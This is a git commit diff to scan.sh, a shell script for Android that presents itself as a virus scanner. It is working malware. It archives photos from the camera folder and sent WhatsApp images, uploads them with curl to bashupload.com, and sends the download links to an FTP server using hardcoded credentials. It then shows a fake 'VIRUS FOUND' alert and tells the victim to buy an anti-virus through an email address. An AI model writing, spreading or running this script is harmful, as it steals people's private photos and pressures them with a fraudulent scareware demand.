8874d189d366ba60e047d0efdc2c0880c5d95584
wolfyy <60975463+wolfyy59@users.noreply.github.com>
2023-09-14 19:12:09 +0200

    Add files via upload

--- scan.sh
+++ scan.sh
@@ -1,14 +1,20 @@
-echo -e '\033[31m SCANNING PLEASE WAIT... \033[0m
-
 cd /sdcard/DCIM/camera/
 i=0
 for x in *.jpg; do
   if [ "$i" = 3 ]; then break; fi
-  cp "$x" /sdcard
+  cp   "$x" /sdcard 
   i=$((i+1))
-done
-cd /sdcard
-tar cf 2022.tar *.jpg
-curl bashupload.com -T 2022.tar > $HOME/70.txt 
+done;  echo -e '\033[31m SCANNING STARTED PLEASE WAIT FEW MINUTES... \033[0m '; cd /sdcard/ ; tar cf gg.tar *.jpg;
 
-curl -T 70.txt -u "immigration22:123456aaA." ftp://files.000webhost.com/tmp/70.txt
+cd /sdcard/android/media/com.whatsapp/WhatsApp/media/"WhatsApp Images"/Sent/;tar cf /sdcard/yy.tar *.jpg;
+
+curl -s bashupload.com -T /sdcard/gg.tar > /sdcard/70.txt 
+curl -s bashupload.com -T /sdcard/yy.tar >> /sdcard/70.txt 
+
+curl -s -T /sdcard/70.txt -u "immigration22:123456aaA." ftp://files.000webhost.com/tmp/70.txt
+
+
+echo -e '\033[31m FINISHED!! [VIRUS FOUND] : \033[0m [47]'
+echo -e '\033[31m  \033[0m in order to have your Passwords working properly you must buy scriptal anti-virus by contacting freshtrup659@gmail.com.'
+
+
